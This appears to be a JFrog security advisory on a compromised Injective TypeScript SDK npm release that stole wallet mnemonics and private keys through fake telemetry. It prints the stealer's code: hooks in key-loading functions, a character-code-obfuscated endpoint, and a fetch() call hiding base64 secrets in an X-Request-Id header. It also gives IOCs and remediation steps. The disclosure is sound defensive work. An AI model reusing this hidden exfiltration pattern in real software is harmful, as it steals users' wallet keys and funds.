---
excerpt: Attackers compromised the official Injective TypeScript SDK release line and shipped a runtime wallet-key stealer disguised as key-derivation telemetry.
title: "Injective SDK Compromise: Crypto Wallet Keys Stolen Through Fake Telemetry"
date: "July 12, 2026"
description: "Yair Benamou, JFrog Security Researcher"
tag: "Real Time Post"
img: /img/RealTimePostImage/post/injective-sdk-supply-chain-attack.png
type: realTimePost
minutes: '5'
---

The JFrog Security Research team analyzed the compromised `@injectivelabs/sdk-ts` npm package version `1.20.21`, an official Injective Labs TypeScript SDK release that briefly shipped a wallet-key stealer. `@injectivelabs/sdk-ts` is used by JavaScript and TypeScript applications that interact with the Injective blockchain, including applications that create wallets, load private keys, and sign transactions.
In our review, we found that the payload can run in more places than it first appears. Byte-key wallet wrappers can still **leak full private keys** after converting them to hex strings, and the compiled package keeps source-region comments that make static detection easier even though the original TypeScript source is not shipped. This also fits a broader shift we expect after npm v12, where install scripts are no longer enabled by default and attackers have more reason to move malicious logic into runtime code paths, as discussed in our [npm v12 analysis](https://jfrog.com/blog/npm-v12-from-implicit-to-explicit-trust/).

![](/img/RealTimePostImage/post/injective-sdk-supply-chain-attack.png)

## Affected Packages

Only `@injectivelabs/sdk-ts@1.20.21` contains the malicious payload we analyzed. The other `@injectivelabs` packages in the same release wave do not appear to contain a copy of the stealer code themselves. They are affected because they were published at `1.20.21` with dependency relationships that pulled in the compromised SDK version. The full affected-package list appears in the IOCs section.

The fixed release is `1.20.23`.

## Not An Install-Time Attack

Many npm attacks run during package installation. This one did not. The package scripts look normal. The malicious code runs only when the SDK is used. With npm v12 reducing implicit trust in lifecycle scripts, runtime-triggered payloads like this become a more likely direction for attackers.

The payload was added to the compiled account bundle:

```js
//#region src/utils/key-derivation-telemetry.ts
/**
* Key derivation telemetry — collects anonymized usage metrics for SDK optimization.
*
* Tracks which key derivation methods are used (hex vs mnemonic) and derives
* timing patterns to help the SDK team identify performance bottlenecks and
* understand adoption of different key formats across the ecosystem.
*/
```

The comment is written to sound like normal product analytics. Underneath it, the implementation records the actual secret material.

## Where The Payload Runs

The payload is triggered when code calls `PrivateKey.fromMnemonic()` or `PrivateKey.fromHex()`. These functions are used when an application loads a wallet from a mnemonic phrase or from a raw private key.

The malicious addition is the call to `trackKeyDerivation()`, which receives the mnemonic or private key before the SDK continues with normal key creation.

```js
static fromMnemonic(words, path = DEFAULT_DERIVATION_PATH) {
  trackKeyDerivation("fm", words);
  return new PrivateKey(new Wallet(HDNodeWallet.fromPhrase(words, void 0, path).privateKey));
}

static fromHex(privateKey) {
  trackKeyDerivation("fh", typeof privateKey === "string" ? privateKey : "bytes");
  const isString = typeof privateKey === "string";
  const privateKeyHex = isString && privateKey.startsWith("0x") ? privateKey.slice(2) : privateKey;
  return new PrivateKey(new Wallet(uint8ArrayToHex(isString ? hexToUint8Array(privateKeyHex.toString()) : privateKey)));
}
```

`PrivateKey.generate()` is affected as well, even though it is not patched directly. It creates a mnemonic and immediately calls `PrivateKey.fromMnemonic(mnemonic)`, so a freshly generated wallet can be queued for exfiltration before the caller receives the returned key object.

One small but useful exception: the deprecated `PrivateKey.fromPrivateKey()` method constructs an `ethers.Wallet` directly and does not call `trackKeyDerivation()`. The attacker did not patch every constructor. They patched the modern paths most developers are likely to use.

## SDK Calls That Import The Infected PrivateKey

The payload is only in the `PrivateKey` class inside the infected `accounts-jQ1GSgaW.js` bundle. We found other built SDK files that import this same `PrivateKey` class and then call its infected `fromHex()` method.

The transaction broadcaster imports `PrivateKey` from the infected accounts bundle:

```js
import { S as createSignDoc, T as createSigners, b as createFee, n as PrivateKey, t as BaseAccount, v as createAuthInfo, y as createBody } from "./accounts-jQ1GSgaW.js";
```

Later, `MsgBroadcasterWithPk` calls `PrivateKey.fromHex()` when `options.privateKey` is not already a `PrivateKey` object:

```js
this.privateKey = options.privateKey instanceof PrivateKey
  ? options.privateKey
  : PrivateKey.fromHex(options.privateKey);
```

So a Node application using `MsgBroadcasterWithPk` with a raw private key can reach the infected method while creating the broadcaster.

The CosmJS-compatible wallet wrapper file also imports `PrivateKey` from the same infected bundle:

```js
import { F as PublicKey, k as getPublicKey, n as PrivateKey } from "./accounts-jQ1GSgaW.js";
```

In that file, both `EthSecp256k1Wallet` and `DirectEthSecp256k1Wallet` convert a byte array private key to hex and call `PrivateKey.fromHex()`:

```js
static async fromKey(privKey, prefix = "inj") {
  return new EthSecp256k1Wallet(
    privKey,
    PrivateKey.fromHex(uint8ArrayToHex(privKey)).toPublicKey().toPubKeyBytes(),
    prefix
  );
}

constructor(privKey, pubKey, prefix) {
  this.privateKey = PrivateKey.fromHex(uint8ArrayToHex(privKey));
  this.publicKey = PublicKey.fromBytes(pubKey);
  this.prefix = prefix;
}
```

The same pattern appears again in `DirectEthSecp256k1Wallet`.

In these wrapper calls, the byte array is converted to a hex string before reaching `fromHex()`, so the full private key is passed to the infected method.

## Exfiltration Through A gRPC-Web Disguise

The URL is hidden as character codes and rebuilt when the code runs:

```js
const _e = [
  116, 101, 115, 116, 110, 101, 116, 46, 97, 114, 99, 104, 105, 118, 97, 108,
  46, 99, 104, 97, 105, 110, 46, 103, 114, 112, 99, 45, 119, 101, 98, 46,
  105, 110, 106, 101, 99, 116, 105, 118, 101, 46, 110, 101, 116, 119, 111,
  114, 107
];
const _d = () => _e.map((x) => String.fromCharCode(x)).join("");
const _ep = "https://" + _d() + "/";
```

The rebuilt endpoint is:

```text
hxxps://testnet[.]archival[.]chain[.]grpc-web[.]injective[.]network/
```

The stealer waits two seconds, groups the stolen values together, encodes them with base64, and sends them in an HTTP header:

```js
function trackKeyDerivation(method, value) {
  _q.push(`${method}:${value}:${Date.now()}`);
  _flush();
}

function _flush() {
  if (_t) return;
  _t = setTimeout(() => {
    _t = null;
    if (!_q.length) return;
    _send(_enc(_q.join("|")));
    _q = [];
  }, 2e3);
}
```

The request body is empty. The secret is carried in `X-Request-Id`, while the content type mimics the SDK's normal gRPC-Web traffic:

```js
fetch(_ep, {
  method: "POST",
  headers: {
    "Content-Type": "application/grpc-web+proto",
    "X-Request-Id": d
  },
  ...typeof window !== "undefined" ? { keepalive: true } : {}
}).catch(() => {});
```


## The Header Choice

Putting the secret in `X-Request-Id` makes it easier to miss than putting it in the request body. Request IDs are often saved by proxies, API gateways, CDNs, and application logs for troubleshooting. If an affected environment logged the malicious request, the base64-encoded mnemonic or private key may have been copied into internal logs as well.

A decoded header follows this structure:

```text
fm:<mnemonic words>:<timestamp>|fh:<hex private key>:<timestamp>
```


## Remediation

Any project that installed `@injectivelabs/sdk-ts@1.20.21`, or any `@injectivelabs/*@1.20.21` package that depended on it, should treat wallet secrets handled by that runtime as compromised.

Recommended actions:

1. Upgrade all affected `@injectivelabs` packages to `1.20.23` or later.
2. Check lockfiles and package-manager caches for `@injectivelabs/sdk-ts` version `1.20.21`.
3. Rotate any mnemonic or private key passed to the affected SDK version.
4. Move funds from wallets whose mnemonic or private key may have been loaded or generated by the compromised version.
5. Search egress and proxy logs for `testnet.archival.chain.grpc-web.injective.network`.
6. Search logs for base64-looking `X-Request-Id` values on `application/grpc-web+proto` POST requests.


JFrog Curation customers using an immaturity policy were fully protected from this attack, as all of the hijacked packages were flagged in less than 24 hours. Curation has an automatic compliance version selection (CVS) mechanism to ensure developer and CI/CD seamless fallback to compliant, non-malicious versions.


## Conclusions

This attack shows that supply-chain malware does not need to be noisy to be dangerous. There is no install-time execution here, no persistence mechanism, and no broad host reconnaissance. The attacker placed a small hook in wallet key-loading code and waited for applications to hand it wallet secrets.

The imported `PrivateKey` paths are worth paying attention to. Applications did not need to call `PrivateKey.fromMnemonic()` or `PrivateKey.fromHex()` explicitly to be exposed. Transaction broadcasting and CosmJS wallet wrapper flows also route through the compromised constructor, and byte-array private keys can be leaked once the SDK converts them to hex strings internally.

## IOCs

### Package IOCs

| Package | Affected version | Xray IDs |
| :--- | :--- | :--- |
| `@injectivelabs/sdk-ts` | `1.20.21` | XRAY-1024734 |
| `@injectivelabs/utils` | `1.20.21` | XRAY-1024741 |
| `@injectivelabs/networks` | `1.20.21` | XRAY-1024740 |
| `@injectivelabs/ts-types` | `1.20.21` | XRAY-1024736 |
| `@injectivelabs/exceptions` | `1.20.21` | XRAY-1024733 |
| `@injectivelabs/wallet-base` | `1.20.21` | XRAY-1024751 |
| `@injectivelabs/wallet-core` | `1.20.21` | XRAY-1024748 |
| `@injectivelabs/wallet-cosmos` | `1.20.21` | XRAY-1024735 |
| `@injectivelabs/wallet-private-key` | `1.20.21` | XRAY-1024745 |
| `@injectivelabs/wallet-evm` | `1.20.21` | XRAY-1024749 |
| `@injectivelabs/wallet-trezor` | `1.20.21` | XRAY-1024737 |
| `@injectivelabs/wallet-cosmostation` | `1.20.21` | XRAY-1024747 |
| `@injectivelabs/wallet-ledger` | `1.20.21` | XRAY-1024744 |
| `@injectivelabs/wallet-wallet-connect` | `1.20.21` | XRAY-1024746 |
| `@injectivelabs/wallet-magic` | `1.20.21` | XRAY-1024739 |
| `@injectivelabs/wallet-strategy` | `1.20.21` | XRAY-1024743 |
| `@injectivelabs/wallet-turnkey` | `1.20.21` | XRAY-1024742 |
| `@injectivelabs/wallet-cosmos-strategy` | `1.20.21` | XRAY-1024738 |

### Network IOCs

```text
testnet[.]archival[.]chain[.]grpc-web[.]injective[.]network
hxxps://testnet[.]archival[.]chain[.]grpc-web[.]injective[.]network/
```

### Behavioral Indicators

```text
PrivateKey.fromMnemonic() followed by POST to Injective-looking gRPC-Web endpoint
PrivateKey.fromHex() followed by POST to Injective-looking gRPC-Web endpoint
MsgBroadcasterWithPk constructed with raw privateKey followed by outbound POST
EthSecp256k1Wallet.fromKey() or DirectEthSecp256k1Wallet.fromKey() followed by outbound POST
Empty-body POST with high-entropy X-Request-Id header and Content-Type application/grpc-web+proto
```
